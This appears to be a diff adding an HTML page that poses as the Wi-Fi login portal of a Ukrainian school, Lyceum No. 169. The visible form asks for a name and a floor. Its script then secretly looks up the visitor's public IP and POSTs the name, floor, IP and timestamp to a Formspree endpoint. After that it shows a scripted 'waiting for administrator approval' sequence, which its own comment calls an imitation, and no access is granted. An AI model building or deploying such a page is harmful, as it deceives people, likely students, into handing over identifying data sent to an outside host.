@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Мережева авторизація | Ліцей №169</title>
+    <style>
+        :root {
+            --bg-color: #ffffff;
+            --secondary-bg: #f9fafb;
+            --text-main: #1a1a1a;
+            --text-muted: #6b7280;
+            --accent: #2563eb;
+            --border: #e5e7eb;
+        }
+
+        body {
+            font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--secondary-bg);
+            color: var(--text-main);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .auth-container {
+            background: var(--bg-color);
+            width: 100%;
+            max-width: 380px;
+            padding: 45px 35px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            border: 1px solid var(--border);
+        }
+
+        .header-label {
+            display: block;
+            text-align: center;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            color: var(--accent);
+            margin-bottom: 8px;
+        }
+
+        h1 { 
+            font-size: 22px; 
+            font-weight: 600; 
+            text-align: center; 
+            margin: 0 0 35px 0; 
+            color: var(--text-main);
+        }
+
+        .form-group { margin-bottom: 22px; }
+        
+        label { 
+            display: block; 
+            font-size: 13px; 
+            font-weight: 500; 
+            margin-bottom: 8px; 
+            color: var(--text-muted); 
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+            background: #fff;
+            color: var(--text-main);
+            outline: none;
+        }
+
+        input:focus { border-color: var(--accent); }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--accent);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--accent);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .hidden { display: none; }
+        .waiting-box { text-align: center; }
+        .sub-text { font-size: 14px; color: var(--text-muted); margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="auth-container">
+    <div id="auth-form">
+        <span class="header-label">Отримати доступ до інтернету</span>
+        <h1>Ліцей №169</h1>
+        
+        <div class="form-group">
+            <label>Локація:</label>
+            <select id="floor">
+                <option value="1">Перший поверх</option>
+                <option value="2">Другий поверх</option>
+                <option value="3">Третій поверх</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label>Прізвище та ім'я:</label>
+            <input type="text" id="username" placeholder="Введіть ваші дані">
+        </div>
+
+        <button onclick="processLogin()">Увійти</button>
+    </div>
+
+    <div id="waiting-screen" class="waiting-box hidden">
+        <h1>Авторизація</h1>
+        <div class="spinner"></div>
+        <p style="font-weight: 500;">Зачекайте на дозвіл адміністратора</p>
+        <p id="dynamic-status" class="sub-text">Ініціалізація запиту...</p>
+    </div>
+</div>
+
+<script>
+    async function processLogin() {
+        const name = document.getElementById('username').value;
+        const floor = document.getElementById('floor').value;
+
+        if (name.trim().length < 3) {
+            alert("Будь ласка, введіть Прізвище та Ім'я");
+            return;
+        }
+
+        // Візуальна зміна екрану
+        document.getElementById('auth-form').classList.add('hidden');
+        document.getElementById('waiting-screen').classList.remove('hidden');
+
+        try {
+            // 1. Отримання IP у фоновому режимі
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const userIp = ipData.ip;
+
+            // 2. Вивід в консоль (для перевірки через F12)
+            console.log("%c--- ДАНІ ЗАПИТУ ---", "color: #2563eb; font-weight: bold;");
+            console.log(`Об'єкт: ${name}`);
+            console.log(`Поверх: ${floor}`);
+            console.log(`IP-адреса: ${userIp}`);
+
+            // 3. Відправка на Formspree (твій ID: xrerlvaj)
+            await fetch('https://formspree.io/f/xrerlvaj', {
+                method: 'POST',
+                headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    "Користувач": name,
+                    "Локація": floor + " поверх",
+                    "IP": userIp,
+                    "Час": new Date().toLocaleString()
+                })
+            });
+
+        } catch (err) {
+            console.log("Помилка передачі даних.");
+        }
+
+        // Імітація процесу перевірки
+        const statuses = [
+            "З'єднання зі шлюзом...",
+            "Синхронізація з сервером ліцею...",
+            "Запит надіслано модератору мережі",
+            "Очікування підтвердження доступу..."
+        ];
+        
+        let i = 0;
+        const statusEl = document.getElementById('dynamic-status');
+        const interval = setInterval(() => {
+            if (i < statuses.length) {
+                statusEl.innerText = statuses[i];
+                i++;
+            } else {
+                clearInterval(interval);
+            }
+        }, 3500);
+    }
+</script>
+
+</body>
+</html>
